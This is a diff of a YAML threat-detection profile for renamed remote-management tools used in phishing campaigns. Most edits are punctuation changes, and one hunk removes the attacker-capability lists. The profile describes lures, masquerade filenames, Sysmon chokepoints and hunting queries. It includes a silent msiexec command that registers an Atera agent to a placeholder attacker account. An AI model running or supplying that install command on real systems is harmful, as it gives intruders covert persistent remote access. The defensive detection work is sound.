@@ -14,7 +14,7 @@ Description: 'Legitimate remote management and monitoring (RMM) tools are rename
   (tax documents, invoices, IT support tools) and delivered via browser download. Once executed, the RMM establishes persistent
   command-and-control to attacker infrastructure while appearing to be a signed, legitimate binary. Because the binary is
   legitimately signed by the vendor, many security tools will not flag it. The chokepoint is the browser download, file masquerading,
-  user execution, and outbound connection to RMM infrastructure — all of which are required regardless of which RMM tool is
+  user execution, and outbound connection to RMM infrastructure. All of which are required regardless of which RMM tool is
   used.
 
   '
@@ -27,7 +27,7 @@ Variations:
   SourceURL: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a
   NotesShort: Declining; February 2024 production breach revoked signing cert, driving actor migration
   Notes: 'Common masquerade names: invoice.exe, tax_form.exe, SSN_verification.exe; February 2024 production server breach
-    resulted in source code and code signing certificate theft — certificate revoked, driving threat actor migration to other
+    resulted in source code and code signing certificate theft. Certificate revoked, driving threat actor migration to other
     tools'
   VariantId: anydesk
   Command:
@@ -61,7 +61,7 @@ Variations:
   NotesShort: Primary renamed-binary choice; CVE-2024-1709 also enables direct server exploitation
   Notes: 'Common masquerade names: support_tool.exe, IT_access.exe; now primary choice for renamed-binary delivery; February
     2024 CVE-2024-1709 (auth bypass) + CVE-2024-1708 (path traversal) enabled direct server exploitation by LockBit, Black
-    Basta, and Bl00dy — 18,188 exposed instances globally at time of disclosure; dual vector: user-delivered binary AND direct
+    Basta, and Bl00dy. 18,188 exposed instances globally at time of disclosure; dual vector: user-delivered binary AND direct
     server exploitation'
   VariantId: screenconnect-connectwise
   Command:
@@ -149,7 +149,7 @@ Variations:
   VariantId: atera
   Command:
     Invocation: "msiexec /i AteraSetup.msi /qn INTEGRATORLOGIN=attacker@email.com ACCOUNTID=<attacker_account>\n# Silent install, agent registers to attacker's Atera account"
-    Context: 'Cloud-based RMM. MSI registers agent to attacker Atera account. Uses legitimate Atera cloud — domain blocking difficult.'
+    Context: 'Cloud-based RMM. MSI registers agent to attacker Atera account. Uses legitimate Atera cloud; domain blocking difficult.'
     Artifacts:
     - 'Sysmon EID 1: msiexec.exe with /qn flag installing Atera MSI'
     - 'Sysmon EID 11: AteraAgent.exe installed'
@@ -160,7 +160,7 @@ Variations:
   Status: Active
   SourceURL: https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/
   NotesShort: First RMM deploys a second for redundancy; removes single point of C2 failure
-  Notes: 'One RMM (e.g., ScreenConnect) deploys a second RMM (e.g., AnyDesk) for redundancy — if one is removed, the other
+  Notes: 'One RMM (e.g., ScreenConnect) deploys a second RMM (e.g., AnyDesk) for redundancy. If one is removed, the other
     maintains access
 
     '
@@ -189,7 +189,7 @@ MasqueradeThemes:
   - tax-document-2024.exe (inferred pattern)
   LureDetails: 'IRS impersonation emails ("Refund Eligibility Notification", "EFIN Verification Required") direct victims
     to attacker-controlled sites. Domains follow patterns like doc-irs[.]us. Microsoft documented a February 2025 wave delivering
-    SimpleHelp via IRS EFIN lure. Highly seasonal — spikes January–April around US tax filing deadlines. Extend detection
+    SimpleHelp via IRS EFIN lure. Highly seasonal. Spikes January–April around US tax filing deadlines. Extend detection
     with W-2, refund, enrollment pretexts during relevant periods.
 
     '
@@ -212,8 +212,8 @@ MasqueradeThemes:
   - Trojanized ScreenConnect installer (Cloudflare research)
   LureDetails: 'Emails with subjects like "Your SSN is going to be suspended (Case ID - SSA-526487442)" direct victims to
     fake SSA portals. Cloudflare Force One documented a specific campaign delivering a trojanized ScreenConnect installer
-    via this pretext. Threat is escalating as public awareness of SSA disruptions increases in 2025 — lure credibility is
-    currently high. ScreenConnect delivery via this theme was confirmed by Cloudflare; other RMM tools inferred from campaign
+    via this pretext. Threat is escalating as public awareness of SSA disruptions increases in 2025; lure credibility is
+    currently high. ScreenConnect delivery via this theme was confirmed by Cloudflare. Other RMM tools inferred from campaign
     infrastructure overlap.
 
     '
@@ -261,12 +261,12 @@ MasqueradeThemes:
   - ScreenConnect
   DocumentedFilenames:
   - Quick Assist (legitimate name)
-  - AnyDesk installer (legitimate name — not renamed in this vector)
+  - AnyDesk installer (legitimate name, not renamed in this vector)
   LureDetails: 'Actor impersonates internal IT helpdesk via Microsoft Teams messages or email flood + phone call. Black Basta
     (Storm-1811) documented by Rapid7 (May 2024) and ReliaQuest: actor sends thousands of spam emails to overwhelm victim
     inbox, then calls or Teams-messages offering "help," directing the victim to install Quick Assist or AnyDesk. A Teams
     + QR code variant escalated in December 2024 (Arctic Wolf). Note: this vector typically uses legitimately-named installers
-    rather than renamed binaries — the social engineering replaces the masquerade. Detection must cover both renamed-binary
+    rather than renamed binaries. The social engineering replaces the masquerade. Detection must cover both renamed-binary
     and IT-directed-installation patterns.
 
     '
@@ -296,10 +296,10 @@ MasqueradeThemes:
   - E-Invite MSI
   LureDetails: 'Fake meeting invites or calendar links direct victims to attacker-controlled download pages serving RMM installers
     with legitimate-looking names. Microsoft Defender Experts (March 2026) documented signed malware (EV certificate: "TrustConnect
-    Software PTY LTD") impersonating Teams, Zoom, Adobe, and Google Meet — delivering ScreenConnect, Tactical RMM, and MeshAgent.
+    Software PTY LTD") impersonating Teams, Zoom, Adobe, and Google Meet, delivering ScreenConnect, Tactical RMM, and MeshAgent.
     Red Canary documented "Party Card Viewer" and "E-Invite" MSI files delivering Atera. Check Point (December 2024) documented
     Google Calendar-delivered phishing targeting 300+ organizations (4,000+ emails). The EV code signing certificate is a
-    critical evasion element — signed MSI files pass many endpoint controls.
+    critical evasion element. Signed MSI files pass many endpoint controls.
 
     '
   Sources:
@@ -349,7 +349,7 @@ MasqueradeThemes:
   - DocuSign/e-signature spoofs (more commonly credential harvesters, not RMM)
   LureDetails: 'HR impersonation emails (salary review, benefits enrollment, onboarding portal) deliver RMM tools. Mimecast
     specifically documented a campaign shift from credential harvesting to RMM tool deployment via HR-themed lures. This pretext
-    is less common than IT support or invoice lures for RMM delivery — HR themes more frequently deliver credential harvesters
+    is less common than IT support or invoice lures for RMM delivery. HR themes more frequently deliver credential harvesters
     or document-based malware. When RMM delivery does occur, it typically involves DocuSign spoofs or "sign your employment
     documents" pretexts directing victims to a download.
 
@@ -382,19 +382,7 @@ MasqueradeThemes:
   - Red Canary — fake update pages with security framing
 Prerequisites:
 - User account can execute binaries from browser download paths (Downloads, Temp, AppData)
-- RMM binary carries a valid vendor code-signing certificate — hash-based detection does not fire
-AttackerControls:
-- Choice of RMM tool (AnyDesk, ScreenConnect, TeamViewer, RustDesk)
-- Social engineering pretext (tax form, IT helpdesk, invoice)
-- Filename used to masquerade the RMM binary
-- Delivery infrastructure (compromised site, malvertising, email)
-- C2 relay configuration (vendor cloud vs. self-hosted)
-AttackerCannotControl:
-- RMM binary must be downloaded to disk via browser
-- Binary must execute as a process — PE metadata reveals true identity
-- Outbound connection to RMM relay is required for remote access
-- File creation event is logged (Sysmon EID 11)
-- Process creation event is logged with OriginalFilename mismatch
+- RMM binary carries a valid vendor code-signing certificate; hash-based detection does not fire
 Chokepoints:
 - Stage: Browser Download
   Input: User clicks a link or is directed to download a file from an attacker-controlled or compromised site
@@ -402,7 +390,7 @@ Chokepoints:
     or generic filename masking RMM software
   Observable: 'Sysmon EID 11 showing browser process (chrome.exe, msedge.exe) writing an executable to Downloads/Temp.
     File hash matches a known RMM tool despite the campaign-themed filename.'
-  WhyCantBypass: The binary must land on disk before execution — no in-memory-only path exists for the initial delivery of
+  WhyCantBypass: The binary must land on disk before execution. No in-memory-only path exists for the initial delivery of
     a standalone RMM installer; the file must be hosted on an attacker-controlled or compromised site reachable by the victim's
     browser, so delivery cannot be skipped in any variant including TOAD phone-assisted delivery
   LogSources:
@@ -412,37 +400,37 @@ Chokepoints:
   SigmaRef: sigma-rules/renamed-rmm/hunt.yml
 - Stage: User Execution
   Input: RMM binary exists on disk with a masqueraded filename
-  Invariant: User executes the downloaded binary, which is a legitimately-signed RMM tool regardless of its filename — PE
+  Invariant: User executes the downloaded binary, which is a legitimately-signed RMM tool regardless of its filename. PE
     metadata (OriginalFilename, Company) betrays the mismatch
   Observable: 'Sysmon EID 1 showing process creation where Image filename differs from PE OriginalFilename metadata.
     For example: Image=tax_form.exe but OriginalFilename=AnyDesk.exe or Company=philandro Software GmbH.'
-  WhyCantBypass: The binary must execute to establish C2 — no execution means no remote access regardless of delivery success
+  WhyCantBypass: The binary must execute to establish C2. No execution means no remote access regardless of delivery success
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
   - Windows Security Event ID 4688 (Process Creation)
   DetectionTier: Analyst
   SigmaRef: sigma-rules/renamed-rmm/analyst.yml
   BypassNote: CVE exploitation of internet-exposed RMM servers (ScreenConnect CVE-2024-1709, SimpleHelp CVE-2024-57727) bypasses
-    all user-execution detection — monitor RMM server process telemetry separately
+    all user-execution detection. Monitor RMM server process telemetry separately
 - Stage: Outbound RMM Connection
   Input: RMM process is running on the endpoint
   Invariant: Executed binary establishes a persistent connection to RMM relay or attacker-controlled server on standard HTTPS
     ports
   Observable: 'Sysmon EID 3 showing outbound HTTPS connection from a process whose Image path is in a user-writable
     directory to known RMM relay domains or self-hosted infrastructure.'
-  WhyCantBypass: The C2 channel must be established — the entire purpose of RMM tool deployment is persistent remote access
+  WhyCantBypass: The C2 channel must be established. The entire purpose of RMM tool deployment is persistent remote access
   LogSources:
   - Sysmon Event ID 3 (Network Connection)
   - Firewall / proxy egress logs
   DetectionTier: Analyst
   SigmaRef: sigma-rules/renamed-rmm/analyst.yml
-  BypassNote: Self-hosted RMM infrastructure (RustDesk, MeshCentral) makes domain-based blocking ineffective — detect by behavior
+  BypassNote: Self-hosted RMM infrastructure (RustDesk, MeshCentral) makes domain-based blocking ineffective. Detect by behavior
     (browser download + execution + outbound), not by destination
 EvolutionTimeline:
 - Date: '2019'
   Event: TeamViewer and AnyDesk adoption in social engineering campaigns
   Change: Legitimate RMM binaries adopted as initial access alternative to malware; signed binaries evade hash-based detection.
-  DetectionImpact: New pattern — signed binaries evading hash-based detection
+  DetectionImpact: New pattern. Signed binaries evading hash-based detection
   Variants: []
   EventType: event
 - Date: 2022-Q3
@@ -558,7 +546,7 @@ OsintSources:
 - Platform: URLScan
   Query: 'filename:MicrosoftTeams.msi OR filename:chrome_update.exe OR filename:security_scan.exe OR filename:verify.exe OR filename:support.exe'
   URL: https://urlscan.io/search/#filename%3AMicrosoftTeams.msi%20OR%20filename%3Achrome_update.exe%20OR%20filename%3Asecurity_scan.exe%20OR%20filename%3Averify.exe%20OR%20filename%3Asupport.exe
-  Notes: 'Targets documented masquerade filenames used in renamed RMM campaigns — fake Teams installers
+  Notes: 'Targets documented masquerade filenames used in renamed RMM campaigns, including fake Teams installers
     (March 2026 signed malware campaign), fake Chrome updates (SocGholish/FakeUpdates), and security/support
     themed binaries (UltraViewer campaigns). Rotate with seasonal themes: tax-document, invoice, SSN,
     E-Invite, Party Card Viewer during relevant periods.'
@@ -570,13 +558,13 @@ OsintSources:
 - Platform: Censys
   Query: 'services.tls.certificate.parsed.subject.common_name: "SimpleHelp"'
   URL: https://search.censys.io/search?resource=hosts&q=services.tls.certificate.parsed.subject.common_name%3A+%22SimpleHelp%22
-  Notes: Finds infrastructure presenting SimpleHelp TLS certificates — currently the most actively exploited RMM platform
+  Notes: Finds infrastructure presenting SimpleHelp TLS certificates; currently the most actively exploited RMM platform
     per CISA AA25-163A.
 - Platform: VirusTotal Intelligence
   Query: have:itw tag:peexe (metadata:"AnyDesk" OR metadata:"ScreenConnect" OR metadata:"SimpleHelp" OR metadata:"NetSupport")
   URL: https://www.virustotal.com/gui/search/have%3Aitw%20tag%3Apeexe%20metadata%3A%22AnyDesk%22
   Notes: Requires VT Intelligence subscription; finds PE executables in the wild whose internal metadata references known
-    RMM vendors — the core renamed-binary delivery mechanism.
+    RMM vendors; the core renamed-binary delivery mechanism.
 - Platform: LOLRMM
   URL: https://lolrmm.io
   Notes: Community-maintained catalog of every known RMM tool with file metadata, network indicators, and detection heuristics
@@ -615,13 +603,13 @@ RawLogs:
 
     CreationUtcTime: 2024-10-15 09:34:12.881
 
-    # Browser drops .exe directly to Downloads — combined with execution signals Hunt/Analyst rules
+    # Browser drops .exe directly to Downloads. Combined with execution signals Hunt/Analyst rules
 
     '
 - Type: Sysmon
   EventId: 1
   Source: Microsoft-Windows-Sysmon/Operational
-  Description: Renamed RMM binary executed — OriginalFilename mismatch is the Analyst signal
+  Description: Renamed RMM binary executed. OriginalFilename mismatch is the Analyst signal
   MatchedRules:
   - Research
   - Hunt
